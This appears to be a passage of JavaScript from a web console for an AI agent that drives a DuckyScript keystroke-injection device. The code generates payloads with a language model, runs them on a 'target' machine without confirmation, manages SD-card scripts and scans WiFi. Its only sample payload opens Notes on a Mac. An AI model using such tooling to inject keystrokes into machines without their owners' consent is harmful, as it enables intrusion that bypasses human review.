Thought: <final reasoning>
FINAL: <summary of what was done>

## CRITICAL RULES
1. Output ONLY Format A or Format B. NEVER write "Observation:" yourself — the system injects real results.
2. After writing "Action Input: ...", STOP. Do not continue. Wait for the Observation.
3. Never skip calling tools. Always call generate_hid_script before execute_script when creating new payloads.
4. Never make up tool results. Never assume success without seeing an Observation.
5. One tool call per response. No chaining multiple Actions in one response.
6. In all generated DuckyScript payloads, always include DELAY 2000 after each action line.

## AVAILABLE TOOLS

execute_script
  Executes DuckyScript payload directly on target HID device. Input: full DuckyScript code.

generate_hid_script
  Uses AI to generate a DuckyScript payload for a task. Input: plain text task description.
  Always call this FIRST when asked to create a script.

run_script
  Runs an existing DuckyScript file saved on the SD card by path (e.g. /Utility/notes.txt). Input: file path.

list_files
  Lists files and folders in a directory on the SD card. Input: directory path (e.g. / or /Utility or /Shortcuts)

read_file
  Reads contents of a file on the SD card. Input: full path (e.g. /Utility/notes.txt)

write_file
  Creates or overwrites a file on the SD card (auto-creates parent directories if needed).
  Input: JSON like {"path":"/Utility/notes.txt", "content":"GUI SPACE\nDELAY 2000\nSTRING notes\nDELAY 2000\nENTER\nDELAY 2000"}

create_directory
  Creates a new folder on the SD card. Input: directory path (e.g. /Utility)

delete_file
  Deletes a file or directory from the SD card. Input: file or folder path (e.g. /Utility/notes.txt)

get_device_info
  Returns chip info, MAC, IP, firmware version. Input: none

wifi_scan
  Triggers a WiFi AP scan. Input: none

wifi_connect
  Connects to a WiFi network. Input: {"ssid":"Name","password":"pass"}

neopixel_set
  Sets NeoPixel RGB color. Input: {"r":255,"g":0,"b":0} or a color name like "red"

neopixel_toggle
  Toggles NeoPixel on/off. Input: none

get_script_from_editor
  Reads the current DuckyScript from the editor tab. Input: none

send_script_to_editor
  Pushes script text into the editor tab. Input: the script text

## DUCKYSCRIPT QUICK REFERENCE
- DELAY 2000      (wait 2000ms after lines)
- STRING hello    (type text)
- ENTER / TAB / SPACE / ESCAPE
- GUI SPACE       (Mac Spotlight, Win Start)
- GUI r           (Win Run dialog)
- CTRL ALT t      (Linux terminal)
- CTRL c / CTRL v (copy/paste)
- F1 .. F12

## EXAMPLE INTERACTION — FILE CREATION & EXECUTION

User: Create a script called notes inside Utility which should open notes on my Mac, then run it.

Thought: First I need to generate the DuckyScript to open Notes on a Mac.
Action: generate_hid_script
Action Input: Open Spotlight on Mac using Command+Space, wait 2000ms, type notes, wait 2000ms, press Enter, wait 2000ms

[System injects → Observation: GUI SPACE\nDELAY 2000\nSTRING notes\nDELAY 2000\nENTER\nDELAY 2000]

Thought: Now I will save this DuckyScript to /Utility/notes.txt on the SD card.
Action: write_file
Action Input: {"path":"/Utility/notes.txt","content":"GUI SPACE\nDELAY 2000\nSTRING notes\nDELAY 2000\nENTER\nDELAY 2000"}

[System injects → Observation: File written successfully to /Utility/notes.txt (67 bytes).]

Thought: Now I will execute the script file /Utility/notes.txt from the SD card.
Action: run_script
Action Input: /Utility/notes.txt

[System injects → Observation: Executed script file from SD card: /Utility/notes.txt]

Thought: The script was created and executed successfully.
FINAL: Created /Utility/notes.txt with the payload to open Notes on Mac and executed it from the SD card.`;

// ─── Tool Implementations ─────────────────────────────────────
const agentTools = {

  async execute_script(input) {
    const script = input.trim();
    if (!script) return 'Error: no script provided';
    try {
      await deviceFetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'duckyscript=' + encodeURIComponent(script)
      });
      return `Script sent to device successfully (${script.split('\n').length} lines).\n\nScript:\n${script}`;
    } catch (e) {
      return 'Error sending script: ' + e.message;
    }
  },

  async generate_hid_script(input) {
    const keyToUse = OPENROUTER_KEY || GROQ_KEY;
    if (!keyToUse) return 'Error: No API key configured. Go to Settings and add your OpenRouter or Groq API key.';

    const isOrKey = keyToUse.startsWith('sk-or-') || Boolean(OPENROUTER_KEY);
    const endpoint = isOrKey ? 'https://openrouter.ai/api/v1/chat/completions' : 'https://api.groq.com/openai/v1/chat/completions';
    const modelToUse = isOrKey ? AGENT_MODEL : GROQ_MODEL;

    const sysPrompt = `You are a DuckyScript expert. Generate ONLY valid DuckyScript for the described task.
CRITICAL RULE: Always insert DELAY 2000 after each action/command line.
DuckyScript syntax rules:
- DELAY <ms>: wait (always use DELAY 2000 after action lines)
- STRING <text>: type text
- ENTER, TAB, SPACE, BACKSPACE, DELETE, ESCAPE: key presses
- GUI <key>: Windows/Mac Command + key (e.g. GUI r, GUI SPACE)
- CTRL <key>: Control + key (e.g. CTRL c, CTRL ALT t)
- ALT <key>: Alt + key
- SHIFT <key>: Shift + key
- F1..F12: function keys
- UPARROW, DOWNARROW, LEFTARROW, RIGHTARROW: arrows
Output ONLY the script, no markdown, no explanation.`;

    const headers = { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + keyToUse };
    if (isOrKey) {
      headers['HTTP-Referer'] = window.location.origin || 'https://ghostchip.local';
      headers['X-Title'] = 'GhostChip AI Agent';
    }

    try {
      const res = await fetch(endpoint, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          model: modelToUse,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: 'Generate DuckyScript for: ' + input }
          ],
          temperature: 0.2,
          max_tokens: 2048
        })
      });
      if (!res.ok) {
        const err = await res.json().catch(() => ({}));
        return 'Error from API: ' + (err.error?.message || res.statusText);
      }
      const data = await res.json();
      return (data.choices[0]?.message?.content || '').trim();
    } catch (e) {
      return 'Error generating script: ' + e.message;
    }
  },

  async get_device_info(_input) {
    try {
      const data = await deviceGet('/info');
      return JSON.stringify(data, null, 2);
    } catch (e) {
      return 'Could not fetch device info: ' + e.message;
    }
  },

  async list_files(input) {
    let path = (input || '/').trim() || '/';
    if (!path.startsWith('/')) path = '/' + path;
    try {
      const r = await fmFetch('/fm/list?path=' + encodeURIComponent(path));
      const text = await r.text();
      let data;
      try { data = JSON.parse(text); } catch { data = null; }
      if (!data) return 'Response: ' + (text || 'Empty response');
      const files = data.files || (Array.isArray(data) ? data : null);
      if (Array.isArray(files)) {
        if (files.length === 0) return `Directory "${path}" is empty.`;
        return files.map(f => {
          const isDir = f.type === 'dir' || f.isDir;
          const sz = f.size !== undefined ? ` (${f.size} B)` : '';
          return `${isDir ? '📁' : '📄'} ${f.name}${sz}`;
        }).join('\n');
      }
      return 'File listing: ' + text;
    } catch (e) {
      return 'Error listing files: ' + e.message;
    }
  },

  async read_file(input) {
    let path = input.trim();
    if (!path) return 'Error: path is required';
    if (!path.startsWith('/')) path = '/' + path;
    try {
      const r = await fmFetch('/fm/download?path=' + encodeURIComponent(path));
      const text = await r.text();
      return text.substring(0, 2000) + (text.length > 2000 ? '\n...(truncated)' : '');
    } catch (e) {
      return 'Error reading file: ' + e.message;
    }
  },

  async write_file(input) {
    let path = '', content = '';
    try {
      const parsed = JSON.parse(input);
      path = parsed.path || '';
      content = parsed.content || '';
    } catch {
      const lines = input.trim().split('\n');
      path = lines[0].trim();
      content = lines.slice(1).join('\n');
    }
    if (!path) return 'Error: path is required. Input format: {"path":"/Folder/file.txt", "content":"..."}';
    if (!path.startsWith('/')) path = '/' + path;

    const lastSlash = path.lastIndexOf('/');
    const folder = lastSlash > 0 ? path.substring(0, lastSlash) : '/';
    const filename = lastSlash >= 0 ? path.substring(lastSlash + 1) : path;

    try {
      if (folder !== '/') {
        await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(folder)).catch(() => {});
      }
      const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
      const form = new FormData();
      const blob = new Blob([content], { type: 'text/plain' });
      form.append('file', blob, filename);
      await fetch(uploadUrl, { method: 'POST', body: form });
      return `File written successfully to ${path} (${content.length} bytes).`;
    } catch (e) {
      return 'Error writing file: ' + e.message;
    }
  },

  async create_directory(input) {
    let path = input.trim();
    if (!path) return 'Error: directory path is required';
    if (!path.startsWith('/')) path = '/' + path;
    try {
      await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(path));
      return `Directory created successfully: ${path}`;
    } catch (e) {
      return 'Error creating directory: ' + e.message;
    }
  },
  async mkdir(input) { return this.create_directory(input); },

  async delete_file(input) {
    let path = input.trim();
    if (!path) return 'Error: path is required for deletion';
    if (!path.startsWith('/')) path = '/' + path;
    try {
      await fmFetchPost('/fm/delete?path=' + encodeURIComponent(path));
      return `Successfully deleted: ${path}`;
    } catch (e) {
      return 'Error deleting: ' + e.message;
    }
  },
  async delete(input) { return this.delete_file(input); },
  async delete_directory(input) { return this.delete_file(input); },
  async delete_file_or_directory(input) { return this.delete_file(input); },

  async run_script(input) {
    let path = input.trim();
    if (!path) return 'Error: script file path is required';
    if (!path.startsWith('/')) path = '/' + path;
    try {
      await fmFetchPost('/fm/run?path=' + encodeURIComponent(path));
      return `Executed script file from SD card: ${path}`;
    } catch (e) {
      return 'Error executing script file: ' + e.message;
    }
  },
  async execute_file(input) { return this.run_script(input); },
  async execute_script_by_path(input) { return this.run_script(input); },
  async run_file(input) { return this.run_script(input); },

  async wifi_scan(_input) {
    try {
      await deviceFetch('/wifi/scan', { method: 'POST' });
      await new Promise(r => setTimeout(r, 3000));
      const data = await deviceGet('/wifi/networks');
      if (data && data.networks) {
        return data.networks.map(n => `📶 ${n.ssid} (${n.rssi}dBm, ch${n.channel})`).join('\n');
      }
      return 'Scan triggered. Check device for results.';
    } catch (e) {
      return 'WiFi scan triggered (result: ' + e.message + ')';
    }
  },

  async wifi_connect(input) {
    let ssid, password;
    try {
      const p = JSON.parse(input);
      ssid = p.ssid; password = p.password || '';
    } catch {
      return 'Error: input must be JSON {"ssid":"...","password":"..."}';
    }
    try {
      await deviceFetch('/wifi/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `ssid=${encodeURIComponent(ssid)}&password=${encodeURIComponent(password)}`
      });
      return `Connection request sent for SSID: ${ssid}`;
    } catch (e) {
      return 'Error connecting: ' + e.message;
    }
  },

  async neopixel_set(input) {
    let r = 0, g = 0, b = 0;
    try {
      const p = JSON.parse(input);
      r = p.r || 0; g = p.g || 0; b = p.b || 0;
    } catch {
      // Try parsing "red", "green", "blue" etc.
      const lc = input.toLowerCase();
      if (lc.includes('red'))    { r=255; g=0;   b=0;   }
      else if (lc.includes('green'))  { r=0;   g=255; b=0;   }
      else if (lc.includes('blue'))   { r=0;   g=0;   b=255; }
      else if (lc.includes('white'))  { r=255; g=255; b=255; }
      else if (lc.includes('purple')) { r=128; g=0;   b=128; }
      else if (lc.includes('cyan'))   { r=0;   g=255; b=255; }
      else if (lc.includes('orange')) { r=255; g=128; b=0;   }
      else if (lc.includes('off'))    { r=0;   g=0;   b=0;   }
      else return 'Error: provide JSON {"r":0,"g":255,"b":0} or a color name';
    }
    try {
      await deviceFetch('/neopixel/set', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `r=${r}&g=${g}&b=${b}`
      });
      return `NeoPixel set to RGB(${r}, ${g}, ${b})`;
    } catch (e) {
      return 'Error setting NeoPixel: ' + e.message;
    }
  },

  async neopixel_toggle(_input) {
    try {
      await deviceFetch('/neopixel/toggle', { method: 'POST' });
      return 'NeoPixel toggled.';
    } catch (e) {
      return 'Toggle sent: ' + e.message;
    }
  },

  async get_script_from_editor(_input) {
    const ta = $('duckyInput') || document.querySelector('textarea[id*="ducky"]');
    if (!ta) return 'Editor not found.';
    return ta.value || '(editor is empty)';
  },

  async send_script_to_editor(input) {
    const ta = $('duckyInput') || document.querySelector('textarea[id*="ducky"]');
    if (!ta) return 'Editor not found.';
    ta.value = input.trim();
    ta.dispatchEvent(new Event('input'));
    return `Script pushed to editor (${input.trim().split('\n').length} lines).`;
  }
};

// ─── Agent UI Helpers ─────────────────────────────────────────
function appendAgentLog(type, label, text, codeText) {
  const log = $('agentLog');
  if (!log) return;
  const icons = {
    user: '👤', thought: '🧠', action: '🔧', observation: '📡',
    final: '✅', error: '❌', thinking: '⏳'
  };
  const labels = {
    user: 'You', thought: 'Reasoning', action: 'Tool Call',
    observation: 'Observation', final: 'Done', error: 'Error', thinking: 'Thinking'
  };
  const entry = document.createElement('div');
  entry.className = `agent-entry agent-${type}`;
  const iconDiv = `<div class="agent-entry-icon">${icons[type] || '•'}</div>`;
  let bodyHtml = `<div class="agent-entry-label">${label || labels[type] || type}</div>`;

  if (type === 'thinking') {
    bodyHtml += `<div class="agent-entry-text"><span class="agent-dots"><span></span><span></span><span></span></span>&nbsp;Thinking…</div>`;
  } else if (type === 'action') {
    bodyHtml += `<div class="agent-entry-text"><span class="agent-tool-badge">${label}</span>`;
    if (codeText) bodyHtml += `<code class="agent-code">${escHtml(codeText)}</code>`;
    bodyHtml += `</div>`;
  } else {
    bodyHtml += `<div class="agent-entry-text">${escHtml(text)}</div>`;
  }

  entry.innerHTML = iconDiv + `<div class="agent-entry-body">${bodyHtml}</div>`;
  log.appendChild(entry);
  log.scrollTop = log.scrollHeight;
  return entry;
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function agentSetStatus(state, text) {
  const dot = $('agentDot');
  const label = $('agentStatusLabel');
  if (dot) { dot.className = 'agent-status-dot' + (state === 'running' ? ' running' : state === 'error' ? ' error' : ''); }
  if (label) label.textContent = text;
}

function agentSetButtons(running) {
  const runBtn = $('agentRunBtn');
  const stopBtn = $('agentStopBtn');
  if (runBtn) runBtn.disabled = running;
  if (stopBtn) stopBtn.disabled = !running;
}

function toggleAgentInspector() {
  agentInspectorOpen = !agentInspectorOpen;
  const body = $('agentToolBody');
  const chev = $('agentInspectorChevron');
  if (body) body.style.display = agentInspectorOpen ? 'block' : 'none';
  if (chev) chev.style.transform = agentInspectorOpen ? 'rotate(180deg)' : '';
}

function updateAgentInspector(toolName, toolInput, toolResult) {
  const inspector = $('agentToolInspector');
  const nameEl = $('agentToolName');
  const body = $('agentToolBody');
  if (inspector) inspector.style.display = 'block';
  if (nameEl) nameEl.textContent = `🔧 ${toolName}`;
  if (body) body.textContent = `INPUT:\n${toolInput}\n\nRESULT:\n${toolResult}`;
}

// ─── Main ReAct Loop ──────────────────────────────────────────
async function runAgent(userMessage) {
  if (agentRunning) return;
  const keyToUse = OPENROUTER_KEY || GROQ_KEY;
  if (!keyToUse) {
    appendAgentLog('error', 'Error', 'No API key found. Please add your OpenRouter or Groq API key in Settings.');
    return;
  }

  const isOrKey = keyToUse.startsWith('sk-or-') || Boolean(OPENROUTER_KEY);
  const endpoint = isOrKey ? 'https://openrouter.ai/api/v1/chat/completions' : 'https://api.groq.com/openai/v1/chat/completions';
  const modelToUse = isOrKey ? AGENT_MODEL : GROQ_MODEL;

  const headers = { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + keyToUse };
  if (isOrKey) {
    headers['HTTP-Referer'] = window.location.origin || 'https://ghostchip.local';
    headers['X-Title'] = 'GhostChip AI Agent';
  }

  agentRunning = true;
  agentAbort = false;
  agentSetButtons(true);
  agentSetStatus('running', 'Running agent…');

  // Add user message to log and history
  appendAgentLog('user', 'You', userMessage);
  agentHistory.push({ role: 'user', content: userMessage });

  const MAX_ITER = 10;
  let iteration = 0;

  // Show thinking indicator
  let thinkingEl = appendAgentLog('thinking', 'Thinking', '');

  try {
    while (iteration < MAX_ITER && !agentAbort) {
      iteration++;
      agentSetStatus('running', `Agent thinking… (step ${iteration}/${MAX_ITER})`);

      const messages = [
        { role: 'system', content: AGENT_SYSTEM_PROMPT },
        ...agentHistory
      ];
      let llmRes;
      try {
        const apiRes = await fetch(endpoint, {
          method: 'POST',
          headers,
          body: JSON.stringify({
            model: modelToUse,
            messages,
            temperature: 0.2,
            max_tokens: 4096
          })
        });
        if (!apiRes.ok) {
          const err = await apiRes.json().catch(() => ({}));
          throw new Error(err.error?.message || apiRes.statusText);
        }
        const apiData = await apiRes.json();
        llmRes = (apiData.choices[0]?.message?.content || '').trim();
      } catch (e) {
        if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }
        appendAgentLog('error', 'API Error', e.message);
        agentHistory.push({ role: 'assistant', content: 'Error: ' + e.message });
        break;
      }

      // Remove thinking indicator on first real response
      if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }

      // Add assistant response to history (assistant role only — no observation yet)
      agentHistory.push({ role: 'assistant', content: llmRes });

      // ── Parse the LLM response ──
      // Thought: everything before Action: or FINAL:
      const thoughtMatch = llmRes.match(/Thought:\s*([\s\S]*?)(?=\nAction:|\nFINAL:|$)/i);
      // Action: single line tool name
      const actionMatch = llmRes.match(/^Action:\s*(.+)$/im);
      // Action Input: everything after "Action Input:" until end-of-string
      // (the model must STOP after this — we enforce it via prompt, not stop tokens)
      const actionInputMatch = llmRes.match(/^Action Input:\s*([\s\S]*)$/im);
      // FINAL: everything after "FINAL:"
      const finalMatch = llmRes.match(/FINAL:\s*([\s\S]*)/i);

      // Show thought
      if (thoughtMatch && thoughtMatch[1].trim()) {
        appendAgentLog('thought', 'Reasoning', thoughtMatch[1].trim());
      }

      // Check for FINAL answer
      if (finalMatch) {
        appendAgentLog('final', 'Done ✓', finalMatch[1].trim());
        agentSetStatus('idle', 'Completed ✓');
        break;
      }

      // Check for tool call
      if (!actionMatch) {
        // No action and no FINAL — show raw response and stop
        appendAgentLog('observation', 'Response', llmRes);
        break;
      }

      const toolName = actionMatch[1].trim().toLowerCase().replace(/\s+/g, '_').replace(/[^a-z_]/g, '');
      const toolInput = actionInputMatch ? actionInputMatch[1].trim() : '';

      // Show action in log
      appendAgentLog('action', toolName, '', toolInput);
      agentSetStatus('running', `Calling tool: ${toolName}…`);

      // Execute the tool
      let toolResult = '';
      if (agentTools[toolName]) {
        try {
          toolResult = await agentTools[toolName](toolInput);
        } catch (e) {
          toolResult = 'Tool error: ' + e.message;
        }
      } else {
        toolResult = `Unknown tool: "${toolName}". Available tools: ${Object.keys(agentTools).join(', ')}`;
      }

      // Update inspector
      updateAgentInspector(toolName, toolInput, toolResult);

      // Show observation in UI
      appendAgentLog('observation', 'Observation', toolResult);

      // Inject observation as a user message — this is the standard ReAct pattern.
      // Using role:'user' so the model clearly sees it came from outside (real tool result).
      agentHistory.push({ role: 'user', content: `Observation: ${toolResult}\n\nContinue with the next step using Format A (if more steps needed) or Format B (if done).` });

      // Show next thinking indicator
      thinkingEl = appendAgentLog('thinking', 'Thinking', '');

      // Small delay to prevent rate limiting
      await new Promise(r => setTimeout(r, 300));
    }

    if (iteration >= MAX_ITER && !agentAbort) {
      if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }
      appendAgentLog('error', 'Limit Reached', `Max iterations (${MAX_ITER}) reached. Agent stopped.`);
      agentSetStatus('idle', `Stopped at max iterations`);
    }

    if (agentAbort) {
      if (thinkingEl) { thinkingEl.remove(); thinkingEl = null; }
      appendAgentLog('error', 'Stopped', 'Agent was stopped by user.');
      agentSetStatus('idle', 'Stopped by user');
    }

  } finally {
    agentRunning = false;
    agentAbort = false;
    agentSetButtons(false);
    if (agentSetStatus && !$('agentStatusLabel')?.textContent.startsWith('Completed')) {
      // only update if not already set to completed
    }
  }
}

// ─── Lifecycle Functions ──────────────────────────────────────
function initAiAgent() {
  agentAbort = false;
  agentSetStatus('idle', 'Idle — ready for instructions');
  agentSetButtons(false);
  // Focus input
  setTimeout(() => { const ta = $('agentInput'); if (ta) ta.focus(); }, 200);
}

function stopAgent() {
  agentAbort = true;
}

function clearAgentLog() {
  agentHistory = [];
  const log = $('agentLog');
  if (!log) return;
  log.innerHTML = `
    <div class="agent-entry agent-welcome">
      <div class="agent-entry-icon">🤖</div>
      <div class="agent-entry-body">
        <div class="agent-entry-label">GhostChip AI Agent</div>
        <div class="agent-entry-text">Log cleared. Ready for new instructions.</div>
      </div>
    </div>`;
  const inspector = $('agentToolInspector');
  if (inspector) inspector.style.display = 'none';
  agentSetStatus('idle', 'Idle — ready for instructions');
}

function runAgentFromInput() {
  const ta = $('agentInput');
  if (!ta) return;
  const msg = ta.value.trim();
  if (!msg) { ta.focus(); return; }
  ta.value = '';
  runAgent(msg);
}

function agentInputKeydown(e) {
  if (e.key === 'Enter' && !e.shiftKey) {
    e.preventDefault();
    runAgentFromInput();
  }
}

function agentQuickPrompt(text) {
  const ta = $('agentInput');
  if (ta) { ta.value = text; ta.focus(); }
}
